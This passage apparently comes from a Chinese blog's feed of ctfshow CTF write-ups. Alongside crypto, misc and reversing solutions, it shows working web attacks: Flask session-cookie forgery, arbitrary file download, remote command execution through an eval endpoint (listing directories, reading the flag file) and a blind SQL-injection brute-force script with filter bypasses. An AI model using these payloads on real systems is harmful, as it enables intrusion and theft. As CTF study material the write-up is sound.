title=\"大牛的密码\"></a>大牛的密码</h2><p>给的加密脚本</p>\n<pre><code class=\"python\">from Crypto.Util.number import *\nfrom flag import flag\nfrom Crypto.Util.Padding import pad\nfrom random import *\ndef s_box(a):\n    box=[i for i in range(a)]\n    shuffle(box)\n    return box\nBLOCK=16\nflag=pad(flag,BLOCK)\nS_BOX=s_box(len(flag))\nm=[i for i in flag]\ndef swap(a,b):\n    tmp = a\n    a = b\n    b = tmp\ndef encrypt1(m):\n    enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)]\n    for i in enc:\n        for j in range(BLOCK):\n            aa=j*7%BLOCK\n            swap(i[j],i[aa])\ndef encrypt2(m):\n    for i in range(16):\n        m=[m[i] for i in S_BOX]\n    return m\nencrypt1(m)\nc=encrypt2(m)\nprint(S_BOX)\nprint(c)\n'''\n[9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]\n[99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]\n'''\n</code></pre>\n<p>比较简单的一个分组密码</p>\n<p>给出解密脚本</p>\n<pre><code class=\"python\">BLOCK=16\nS_BOX = [9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]\ndef encrypt1(m):\n    enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)]\n    for i in enc:\n        for j in range(BLOCK):\n            aa=j*7%BLOCK\n            swap(i[j],i[aa])\ndef encrypt2(m):\n    for i in range(16):\n        m=[m[i] for i in S_BOX]\n    return m\n\ndef de(m):\n    for i in range(16):\n        print(m)\n        tmp = [0]*len(m)\n        j = 0\n        for index in S_BOX:\n            tmp[index] = m[j]\n            j+=1\n        m = tmp\n    return m\n\nm = [99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]\n# print(m)\nm = de(m)\nencrypt1(m)\nfor i in m:\n        print(chr(i),end=\"\")\n</code></pre>\n<p>大致加密流程为，先使用<code>pad</code>将原来的flag进行扩充达到可分组的长度，然后，组内交换，最后使用S盒进行16轮置换</p>\n<p>解密流程为，逆向16轮S盒置换，然后因为组内置换加解密同代码，故解密脚本如上</p>\n<h2 id=\"easy-mini\"><a href=\"#easy-mini\" class=\"headerlink\" title=\"easy_mini\"></a>easy_mini</h2><pre><code class=\"python\">p = 71397796933602469825964946338224836258949974632540581233301840806613437378503\na = 34707491256665545391276236596452538912073367128507057339946181246439062354614\nb = 4772744837719404570039488103932889286126236975047018081148463521123562429424\nE = EllipticCurve(GF(p), [a, b])\nc1 = E(37414446283406201193977113266234367761786780230360175925999700345196415953455,17037724145039910971426670298726906655653040365428438334942732090559637519851)\nc2 = E(60560423732267272277570046154733119097475794979191838027420415113112056962844,54372226143125971429691267751299496959531971082475860532181772357190222938465)\nk = 58155941823118858940343657716409231510854647214870891375273032214774400828217\nm = c1-k*c2\nw2 =16315249811700998894876359855091105114973337718373913477026230968747515636405\nprint(w2/m[0])\n# 7196365442241205186856420688221367789171469258517476477\nm2 = 7196365442241205186856420688221367789171469258517476477\nfor i in range(0,100000):\n    num = str(i) + str(m2)\n    s = long_to_bytes(int(num))\n    if s.startswith(b\"ctfshow{\"):\n        print(s)\n        break\n# ctfshow{the_answer_is_it}\n</code></pre>\n<h2 id=\"easy-xor\"><a href=\"#easy-xor\" class=\"headerlink\" title=\"easy_xor\"></a>easy_xor</h2><pre><code class=\"python\">from Crypto.Util.number import *\nimport gmpy2\n# from secret import flag\n'''\nassert len(flag[8:-1])==23\nm = bytes_to_long(flag)\np = getPrime(1024)\nq = getPrime(1024)\nn = p*q\ne = 65537\nc1 = m^p\nc2 = pow(m,e,n)\nprint(f'c1 = {c1}')\nprint(f'c2 = {c2}')\nprint(f'n = {n}')\n'''\nc1 = 151198307301713399973545627808177783191262282577048906899567665485020342464366268384613589477129150406859219553325982275344405383612415523342568367197935454935162234419239807109194526080836070453102172720442102673200212658553214847476648456720629906051324248179394810385918370092764118401652990951968387233220\nc2 = 7894512574379281106340582833782408137686355961537832816105517328532111343730615739255485918919146012721446905489729048235088965936700563973759759039693443386542070451737445467143517377017890468837697907596398070608179281207203217576205857817411996178441661371846647602166663752324880657668362355493701482869858528298247422875427747085642627978367348931707497113936723122393282697211257939351221141536029828744507560524637999804394951722319070365576391442828074457050403771353328835153787572457070779602728359333021922987279454923820866436212282592764768470608545881718922440010751845730974331917142224339664090863915\nn = 20873587976264698212013861921447267548758723109929620330136081844796427967720295581580927324390713931549639540337285515365487607593546367886570408812338077846317206794057714877394609181224434104303259411081376607299962306250984285173463537669954845497211859940191392861121877814873939865829555350848523691546006073264112091406848179785659505299775196062799482197712761744192962658799557108701192680225134300686608396391566674966897700511638643429161735764600752699251493599533703928135311599575989253347234975026924804433742500175666009324057320386262109587593814197687132304704244158862263859846356497849518103755981\nk = 256\nR.&lt;x&gt; = PolynomialRing(Zmod(n))\nc = (c1&gt;&gt;k)&lt;&lt;k\nf = c + x\nx0 = f.small_roots(2^k,beta=0.4)[0]\n\nm = c1.__xor__(int(x0))\n\nprint(long_to_bytes(m))\n</code></pre>\n<p>p的高位攻击，得到</p>\n<pre><code class=\"raw\">b\"\\xd7PC\\xf0:\\xb67\\xc5\\x9fO+S\\xd0\\xe5eV\\xdc\\x19\\xff\\xf21\\xb4\\xf8L\\xd7C\\x9a\\xcaK\\xba\\xe8\\xa0!'\\x81dt\\xb5\\x00K\\xf0\\xb8L\\x8e'\\xf6\\xba\\xcd\\xc9\\xceY\\xf5x^\\xa4\\xc4v\\x9e\\x03\\x08\\xb6\\xc6\\xf4\\xdb\\x13\\xce(\\x9a\\xde\\xe0B\\x15\\xdf\\x98\\xf2@V\\x92^\\x8c3\\xcdJ\\x05\\xcb-6i9E\\xbf:\\xfd\\x84t\\xccctfshow{m_xor_p_but_coppersmith}\"\n</code></pre>\n<p>（原以为算出p之后可以用rsa的知识解决，但解不出来）</p>\n<h2 id=\"easy-flask\"><a href=\"#easy-flask\" class=\"headerlink\" title=\"easy_flask\"></a>easy_flask</h2><p>根据题目所给</p>\n<pre><code class=\"python\"># app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n\n}\n\n@app.route('/')\ndef index():\n# Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n        return redirect(url_for('profile'))\n    else:\n        msg = 'Incorrect username/password!'\n        return render_template('login.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n</code></pre>\n<p>一开始纠结于<code>render_template('profile2.html', username=session['username'], role=session['role'])</code>的SSTI，但废了极大工夫，并查找资料，可知，该形式不存在SSTI</p>\n<p>这里重要的点在于flask session的伪造，因为注册一个账号，<code>role</code>固定为<code>users</code>，而根据登陆后的<code>But,there are some things I only want to give to users whose role is admin.</code></p>\n<p>需要为<code>admin</code>身份才能获取更多信息</p>\n<p>这里用到flask的伪造<code>python .\\flask_session_cookie_manager3.py encode -t \"{'loggedin': True, 'role': 'admin', 'username': '{{2+5}}'}\"  -s \"S3cr3tK3y\"</code></p>\n<p>得到<code>eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJ7ezIrNX19In0.ZCg8QA.4MmqCWcdgO7YuAko8yxXX5BA0OM</code>，修改cookie的session值，可以得到</p>\n<p><strong>Congratulations! You can download the fakeflag: <span class=\"exturl\" data-url=\"aHR0cDovLzczMzMxNDIwLTI5YjEtNDNhYS04OTExLTEwZGU5YjU0ZjdjNS5jaGFsbGVuZ2UuY3RmLnNob3cvZG93bmxvYWQvP2ZpbGVuYW1lPWZha2VmbGFnLnR4dA==\">Click here</span></strong></p>\n<p>由此，可以得到下载的位置<del>一开始在尝试下载其他的txt，如flag、hint，但都无用</del></p>\n<p>有之前给的代码，显然<code>app.py</code>没给完整，而这个下载文件有个<code>filename</code>，故尝试<code>?filename=app.py</code>，成功下载，得到完整的<code>app.py</code></p>\n<p>app.py</p>\n<pre><code class=\"python\"># app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}\n}\n\n\n\n@app.route('/')\ndef index():\n    # Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n            return redirect(url_for('profile'))\n        else:\n            msg = 'Incorrect username/password!'\n    return render_template('login2.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = '' \n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register2.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n\n\n@app.route('/show/')\ndef show():\n    if 'loggedin' in session:\n        return render_template('show2.html')\n\n@app.route('/download/')\ndef download():\n    if 'loggedin' in session:\n        filename = request.args.get('filename')\n        if 'filename' in request.args:              \n            return send_file(filename, as_attachment=True)\n  \n    return redirect(url_for('login'))\n\n\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n    \n\n\n@app.route('/logout/')\ndef logout():\n   session.pop('loggedin', None)\n   session.pop('id', None)\n   session.pop('username', None)\n   session.pop('role', None)\n   return redirect(url_for('login'))\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=8080)\n</code></pre>\n<p>可以看到<code>/hello/</code>下有<code>eval</code>，可以执行任意代码</p>\n<p>故传入</p>\n<pre><code class=\"raw\">http://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__(\"os\").popen(\"ls\").read()\nhello,app.py fakeflag.txt templates\n\nhttp://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__(\"os\").popen(\"ls /\").read()\nhello,app bin dev etc flag_is_h3re home lib media mnt opt proc root run sbin srv sys tmp usr var\n\nhttp://73331420-29b1-43aa-8911-10de9b54f7c5.challenge.ctf.show/hello/?eval=__import__(\"os\").popen(\"cat /flag_is_h3re\").read()\nhello,ctfshow{487b3c1e-eff3-4c8d-846e-b4e21441a8fd}\n</code></pre>\n<h1 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h1><h2 id=\"奇怪的压缩包\"><a href=\"#奇怪的压缩包\" class=\"headerlink\" title=\"奇怪的压缩包\"></a>奇怪的压缩包</h2><p>首先是伪加密解除</p>\n<p>解压后，得到<code>black.png</code>,010打开，拉到后面，看到有<code>flag.png</code>，且最后有段base64<code>eXVyZW5qaWU=</code>，解码为<code>yurenjie</code>，猜测<code>black.png</code>还包含了一个密码为<code>yurenjie</code>的压缩包</p>\n<p>binwalk文件分离<code>binwalk -e black.png</code>，得到一个<code>3965.zip</code>,以<code>yurenjie</code>为密码解压，得到<code>flag.png</code></p>\n<p>打开图片，很容易发现高不对，于是010修改高，得到flag</p>\n<p><code>ctfshow{Th1s_i5_f1ag}</code></p>\n<h2 id=\"哇库哇库2\"><a href=\"#哇库哇库2\" class=\"headerlink\" title=\"哇库哇库2\"></a>哇库哇库2</h2><h2 id=\"琴柳感\"><a href=\"#琴柳感\" class=\"headerlink\" title=\"琴柳感\"></a>琴柳感</h2><p>官方wp后</p>\n<p>打开文本文档，一堆重复的文字。除去开头和最后的两句话，一共是四句话在重复。这里考虑也许是 Base4，不知四句话各代表什么数，于是爆破factorial(4)=24种可能。</p>\n<p>(应该是base4的编码规则)</p>\n<p>根据wp给的代码，自己简化了一下，为</p>\n<pre><code class=\"python\">'''\nAuthor       : dpm12345 1006975692@qq.com\nGithub       : https://github.com/dpm12345\nDate         : 2023-04-02 19:30:50\nLastEditors  : dpm12345 1006975692@qq.com\nLastEditTime : 2023-04-03 20:22:12\nDescription  : \n'''\n\nfrom Crypto.Util.number import long_to_bytes\nfrom itertools import permutations\nwith open(\"qlg.txt\",\"r\",encoding='gbk') as f:\n    content = f.read()\ncontent = content[8:-23]\ndic = [\"你有没有感受到城市在分崩离析？\",\"你不曾注意阴谋得逞者在狞笑。\",\"你有没有听见孩子们的悲鸣？\",\"你是否想过......朋友不再是朋友，家园不再是家园。\"]\n\ns = list(permutations(['0','1','2','3']))\nfor a,b,c,d in s:\n    tmp1 = content.replace(dic[0],a).replace(dic[1],b).replace(dic[2],c).replace(dic[3],d)\n    tmp2 = 0\n    for i in tmp1:\n        tmp2 &lt;&lt;= 2\n        tmp2+=int(i)\n    print(long_to_bytes(tmp2))\n\n'''\nb'\\x1b2\\x11;\\x16\\x1f376\\x14\\x1d\\x13\\x190\\x1b\\x10\\x1d\\x136\\x14\\x1d\\x13\\x0f4\\x14\\x1905\\x18\\x144\\x14\\x0f5\\x18\\x14\\x17\\x10\\x1e\\x14\\x18\\x1d4\\x14\\x1e\\x14\\x18\\x1d\\x19\\x18&lt;'\nb'\\x1e#\\x11.\\x17\\x1a\"&amp;\\'\\x14\\x19\\x12\\x1d \\x1e\\x10\\x19\\x12\\'\\x14\\x19\\x12\\n$\\x14\\x1d %\\x1c\\x14$\\x14\\n%\\x1c\\x14\\x16\\x10\\x1b\\x14\\x1c\\x19$\\x14\\x1b\\x14\\x1c\\x19\\x1d\\x1c('\nb'\\'1\"7)/3;9(.#&amp;0\\' .#9(.#\\x0f8(&amp;0:$(8(\\x0f:$(+ -($.8(-($.&amp;$&lt;'\nb'-\\x13\"\\x1d+%\\x11\\x19\\x1b(&amp;!.\\x10- &amp;!\\x1b(&amp;!\\x05\\x18(.\\x10\\x1a,(\\x18(\\x05\\x1a,() \\'(,&amp;\\x18(\\'(,&amp;.,\\x14'\nb'6!3&amp;=:\".-&lt;;27 60;2-&lt;;2\\n,&lt;7 /4&lt;,&lt;\\n/4&lt;&gt;09&lt;4;,&lt;9&lt;4;74('\nb'9\\x123\\x19&gt;5\\x11\\x1d\\x1e&lt;71;\\x109071\\x1e&lt;71\\x05\\x1c&lt;;\\x10\\x1f8&lt;\\x1c&lt;\\x05\\x1f8&lt;=06&lt;87\\x1c&lt;6&lt;87;8\\x14'\nb'KvD{BOwsrALGHuKELGrALG_qAHupIAqA_pIACENAILqANAILHI}'\nb'NgDnCJfbcAHFLeNEHFcAHFZaALe`MAaAZ`MABEKAMHaAKAMHLMi'\nb'ctfshow{xingbucengxing_yibuzaiyi_zaikelianyilianba}'\nb'lGfLk`DHKibdnElebdKibdPIinEJmiIiPJmihecimbIicimbnmA'\nb'rdwb|zfnl}{vseru{vl}{vZm}seoq}m}Zoq}~ux}q{m}x}q{sqi'\nb'xFwH~pDLN}st{ExustN}stPM}{EOy}M}POy}|ur}ysM}r}ys{yA'\nb'\\x87\\xb9\\x88\\xb7\\x81\\x8f\\xbb\\xb3\\xb1\\x82\\x8c\\x8b\\x84\\xba\\x87\\x8a\\x8c\\x8b\\xb1\\x82\\x8c\\x8b\\xaf\\xb2\\x82\\x84\\xba\\xb0\\x86\\x82\\xb2\\x82\\xaf\\xb0\\x86\\x82\\x83\\x8a\\x8d\\x82\\x86\\x8c\\xb2\\x82\\x8d\\x82\\x86\\x8c\\x84\\x86\\xbe'\nb'\\x8d\\x9b\\x88\\x9d\\x83\\x85\\x99\\x91\\x93\\x82\\x84\\x89\\x8c\\x9a\\x8d\\x8a\\x84\\x89\\x93\\x82\\x84\\x89\\xa5\\x92\\x82\\x8c\\x9a\\x90\\x8e\\x82\\x92\\x82\\xa5\\x90\\x8e\\x82\\x81\\x8a\\x87\\x82\\x8e\\x84\\x92\\x82\\x87\\x82\\x8e\\x84\\x8c\\x8e\\x96'\nb'\\x93\\xb8\\x99\\xb3\\x94\\x9f\\xbb\\xb7\\xb4\\x96\\x9d\\x9b\\x91\\xba\\x93\\x9a\\x9d\\x9b\\xb4\\x96\\x9d\\x9b\\xaf\\xb6\\x96\\x91\\xba\\xb5\\x92\\x96\\xb6\\x96\\xaf\\xb5\\x92\\x96\\x97\\x9a\\x9c\\x96\\x92\\x9d\\xb6\\x96\\x9c\\x96\\x92\\x9d\\x91\\x92\\xbe'\nb'\\x9c\\x8b\\x99\\x8c\\x97\\x90\\x88\\x84\\x87\\x96\\x91\\x98\\x9d\\x8a\\x9c\\x9a\\x91\\x98\\x87\\x96\\x91\\x98\\xa0\\x86\\x96\\x9d\\x8a\\x85\\x9e\\x96\\x86\\x96\\xa0\\x85\\x9e\\x96\\x94\\x9a\\x93\\x96\\x9e\\x91\\x86\\x96\\x93\\x96\\x9e\\x91\\x9d\\x9e\\x82'\nb'\\xb1\\x98\\xbb\\x91\\xbc\\xb5\\x99\\x9d\\x9c\\xbe\\xb7\\xb9\\xb3\\x9a\\xb1\\xba\\xb7\\xb9\\x9c\\xbe\\xb7\\xb9\\xa5\\x9e\\xbe\\xb3\\x9a\\x9f\\xb2\\xbe\\x9e\\xbe\\xa5\\x9f\\xb2\\xbe\\xbd\\xba\\xb4\\xbe\\xb2\\xb7\\x9e\\xbe\\xb4\\xbe\\xb2\\xb7\\xb3\\xb2\\x96'\nb'\\xb4\\x89\\xbb\\x84\\xbd\\xb0\\x88\\x8c\\x8d\\xbe\\xb3\\xb8\\xb7\\x8a\\xb4\\xba\\xb3\\xb8\\x8d\\xbe\\xb3\\xb8\\xa0\\x8e\\xbe\\xb7\\x8a\\x8f\\xb6\\xbe\\x8e\\xbe\\xa0\\x8f\\xb6\\xbe\\xbc\\xba\\xb1\\xbe\\xb6\\xb3\\x8e\\xbe\\xb1\\xbe\\xb6\\xb3\\xb7\\xb6\\x82'\nb'\\xc6\\xed\\xcc\\xe6\\xc1\\xca\\xee\\xe2\\xe1\\xc3\\xc8\\xce\\xc4\\xef\\xc6\\xcf\\xc8\\xce\\xe1\\xc3\\xc8\\xce\\xfa\\xe3\\xc3\\xc4\\xef\\xe0\\xc7\\xc3\\xe3\\xc3\\xfa\\xe0\\xc7\\xc3\\xc2\\xcf\\xc9\\xc3\\xc7\\xc8\\xe3\\xc3\\xc9\\xc3\\xc7\\xc8\\xc4\\xc7\\xeb'\nb'\\xc9\\xde\\xcc\\xd9\\xc2\\xc5\\xdd\\xd1\\xd2\\xc3\\xc4\\xcd\\xc8\\xdf\\xc9\\xcf\\xc4\\xcd\\xd2\\xc3\\xc4\\xcd\\xf5\\xd3\\xc3\\xc8\\xdf\\xd0\\xcb\\xc3\\xd3\\xc3\\xf5\\xd0\\xcb\\xc3\\xc1\\xcf\\xc6\\xc3\\xcb\\xc4\\xd3\\xc3\\xc6\\xc3\\xcb\\xc4\\xc8\\xcb\\xd7'\nb'\\xd2\\xec\\xdd\\xe2\\xd4\\xda\\xee\\xe6\\xe4\\xd7\\xd9\\xde\\xd1\\xef\\xd2\\xdf\\xd9\\xde\\xe4\\xd7\\xd9\\xde\\xfa\\xe7\\xd7\\xd1\\xef\\xe5\\xd3\\xd7\\xe7\\xd7\\xfa\\xe5\\xd3\\xd7\\xd6\\xdf\\xd8\\xd7\\xd3\\xd9\\xe7\\xd7\\xd8\\xd7\\xd3\\xd9\\xd1\\xd3\\xeb'\nb'\\xd8\\xce\\xdd\\xc8\\xd6\\xd0\\xcc\\xc4\\xc6\\xd7\\xd1\\xdc\\xd9\\xcf\\xd8\\xdf\\xd1\\xdc\\xc6\\xd7\\xd1\\xdc\\xf0\\xc7\\xd7\\xd9\\xcf\\xc5\\xdb\\xd7\\xc7\\xd7\\xf0\\xc5\\xdb\\xd7\\xd4\\xdf\\xd2\\xd7\\xdb\\xd1\\xc7\\xd7\\xd2\\xd7\\xdb\\xd1\\xd9\\xdb\\xc3'\nb'\\xe1\\xdc\\xee\\xd1\\xe8\\xe5\\xdd\\xd9\\xd8\\xeb\\xe6\\xed\\xe2\\xdf\\xe1\\xef\\xe6\\xed\\xd8\\xeb\\xe6\\xed\\xf5\\xdb\\xeb\\xe2\\xdf\\xda\\xe3\\xeb\\xdb\\xeb\\xf5\\xda\\xe3\\xeb\\xe9\\xef\\xe4\\xeb\\xe3\\xe6\\xdb\\xeb\\xe4\\xeb\\xe3\\xe6\\xe2\\xe3\\xd7'\nb'\\xe4\\xcd\\xee\\xc4\\xe9\\xe0\\xcc\\xc8\\xc9\\xeb\\xe2\\xec\\xe6\\xcf\\xe4\\xef\\xe2\\xec\\xc9\\xeb\\xe2\\xec\\xf0\\xcb\\xeb\\xe6\\xcf\\xca\\xe7\\xeb\\xcb\\xeb\\xf0\\xca\\xe7\\xeb\\xe8\\xef\\xe1\\xeb\\xe7\\xe2\\xcb\\xeb\\xe1\\xeb\\xe7\\xe2\\xe6\\xe7\\xc3'\n\n'''\n</code></pre>\n<h2 id=\"低端的base\"><a href=\"#低端的base\" class=\"headerlink\" title=\"低端的base\"></a>低端的base</h2><p>根据base64的原理，base64是一种把二进制值变成文本数据的方式，在输入是文本的情况下，3个原始字符对应的就是4个base64编码后的字符，所以可以对编码后的base64字符4个4个的进行爆破，只要还原出来的3个原始字符在可见字符范围内即可。</p>\n<pre><code class=\"python\">from Crypto.Util.number import *\nimport itertools\nimport base64\n\nwith open(\"题目flag.txt\",\"r\",encoding=\"utf-8\") as f:\n    c = f.read()\n\nfor i in range(int(len(c)/4)):\n    s = c[i*4:i*4+4]\n    tmp = []\n    for x in s:\n        if x.isalpha():\n            tmp.append((x.lower(),x.upper()))\n        else:\n            tmp.append((x))\n    # print(tmp)\n    y = list(itertools.product(*tmp))\n    res = []\n    for q in y:\n        z = \"\".join(q)\n        try:\n            de_str = base64.b64decode(z.encode()).decode()\n            if de_str.isprintable():\n                res.append(de_str)\n        except:\n            pass\n    print(res)\n</code></pre>\n<p><code>ctfshow{base64_1s太难了!!I服了U!}</code></p>\n<h1 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h1><h2 id=\"easy-pyc\"><a href=\"#easy-pyc\" class=\"headerlink\" title=\"easy_pyc\"></a>easy_pyc</h2><p>uncomploy6反编译，得到</p>\n<pre><code class=\"python\">print 'Welcome to CTFshow Re!'\nprint 'your flag is here!'\nflag = ''\nl = len(flag)\nfor i in range(l):\n    num = ((flag[i] + i) % 114514 + 114514) % 114514\n    code += chr(num)\n\ncode = map(ord, code)\nfor i in range(l - 4 + 1):\n    code[i] = code[i] ^ code[(i + 1)]\n\nprint code\ncode = ['\\x16', '\\x1d', '\\x1e', '\\x1a', '\\x18', '\\t', b'\\xff', b'\\xd0', ',', '\\x03', '\\x02', '\\x14', '8', 'm', '\\x01', 'C', 'D', b'\\xbd', b'\\xf7', '*', '\\r', b'\\xda', b'\\xf9', '\\x1c', '&amp;', '5', \"'\", b'\\xda', b'\\xd4', b'\\xd1', '\\x0b', b'\\xc7', b'\\xc7', '\\x1a', b'\\x90', 'D', b'\\xa1']\n</code></pre>\n<p>解密脚本为</p>\n<pre><code class=\"python\">code = ['\\x16', '\\x1d', '\\x1e', '\\x1a', '\\x18', '\\t', b'\\xff', b'\\xd0', ',', '\\x03', '\\x02', '\\x14', '8', 'm', '\\x01', 'C', 'D', b'\\xbd', b'\\xf7', '*', '\\r', b'\\xda', b'\\xf9', '\\x1c', '&amp;', '5', \"'\", b'\\xda', b'\\xd4', b'\\xd1', '\\x0b', b'\\xc7', b'\\xc7', '\\x1a', b'\\x90', 'D', b'\\xa1']\nl = len(code)\nnew_code = [ord(i) for i in code]\nfor i in range(l-4,0,-1):\n    new_code[i] = new_code[i] ^ new_code[i+1]\nprint(new_code)\nfor i in range(l):\n    print(chr(new_code[i]-i),end=\"\")\n</code></pre>\n<p>由于11414过大，所以<code>num = ((flag[i] + i) % 114514 + 114514) % 114514</code>最后值仍为<code>flag[i] + i</code>，之后就是异或的逆运算</p>\n<p>得到<code>tfshow{Just_F00l's_D@y_R3_Ch3ck-in!}</code></p>\n<p>于是flag为<code>ctfshow{Just_F00l's_D@y_R3_Ch3ck-in!}</code></p>\n<h2 id=\"easy-cc\"><a href=\"#easy-cc\" class=\"headerlink\" title=\"easy_cc\"></a>easy_cc</h2><p>IDA打开，字符串窗口，找到比较输入的函数，顺着代码的变化过程，可知加密的流程为</p>\n<p>输入flag -&gt; 读取flag及计算长度 -&gt; 利用已有的”key123”对输入的每个字符进行异或操作 -&gt; 将字符转化为2位16进制代码</p>\n<p>故解密流程为： 每两位读出16进制 -&gt; 转化为10进制 -&gt; 与”key123”异或 -&gt; 得到flag</p>\n<p>解密脚本</p>\n<pre><code class=\"python\">v19 = \"key123\"\ntarget = \"08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216\"\nv17 = []\nfor i in range(0,len(target),2):\n    v17.append(int(target[i:i+2],16))\nnew_v17 = []\nfor i in range(len(v17)):\n    v17[i] = v17[i] ^ ord(v19[i % len(v19)])\nfor i in v17:\n    print(chr(i),end=\"\")\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b63ac8f1/",
            "url": "http://dpm12345.cn/posts/b63ac8f1/",
            "title": "AK赛",
            "date_published": "2022-10-04T15:25:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"签到-观己\"><a href=\"#签到-观己\" class=\"headerlink\" title=\"签到_观己\"></a>签到_观己</h2><p>nginx 日志包含</p>\n<h2 id=\"web1-观字\"><a href=\"#web1-观字\" class=\"headerlink\" title=\"web1_观字\"></a>web1_观字</h2><p>ip 地址可以使用 <code>。</code> 代替 <code>.</code></p>\n<h2 id=\"web2-观星\"><a href=\"#web2-观星\" class=\"headerlink\" title=\"web2_观星\"></a>web2_观星</h2><p>SQL 注入</p>\n<p>令<code>id=1’</code>返回<code>enheng?</code>发现<code>’</code>被过滤了，fuzz测试过滤了<code>空格、’、\"、=、like、ascii、union、order by、|、sleep、 </code>。</p>\n<p>常用的盲注payload为payload=<code>1^if (ascii (substr ('flag',1,1))=104,1,0)</code></p>\n<p>过滤了空格可以用括号代替；</p>\n<p>过滤了单引号可以用16进制代替；</p>\n<p>过滤了逗号，对于<code>substr</code>可以用<code>substr (database () from 1 for 1 )</code>代替<code>substr (database (),1,1)</code>，<code>if</code>中有逗号可以用<code>case when</code>代替<code>if</code>；</p>\n<p>过滤了<code>ascii</code>可以用<code>ord</code>代替；</p>\n<p>过滤了等号和<code>like</code>可以用<code>regexp</code>代替。</p>\n<p>这样上面的常规语句就可以转化为<br><code>id=1^case (ord (substr (database () from (1) for (1)))) when (102) then (2) else (3) end</code></p>\n<pre><code class=\"python\">import requests\nurl = \"http://a1f44411-4202-45d0-a2c2-58d491438f96.challenge.ctf.show/index.php?id=1^\"\nflag = \"\"\nfor i in range(7, 50):\n    print(\"i=\"+str(i))\n    for j in range(38, 126):\n        # u=\"case (ord (substr (database () from ({0}) for (1)))) when ({1}) then (2) else (3) end\".format (i,j)  #库名  web1\n        # u=\"case (ord (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema) regexp (database ())) from ({0}) for (1)))) when ({1}) then (2) else (3) end\".format (i,j) #表名 flag、page、user\n        # u=\"case (ord (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name) regexp (0x666c6167)) from ({0}) for (1)))) when ({1}) then (2) else (3) end\".format (i,j) #列名 FLAG_COLUMN、flag\n        u = \"case(ord(substr((select(group_concat(flag))from(flag))from({0})for(1))))when({1})then(2)else(3)end\".format(\n            i, j)  # flag 字段\n        u = url+u\n        r = 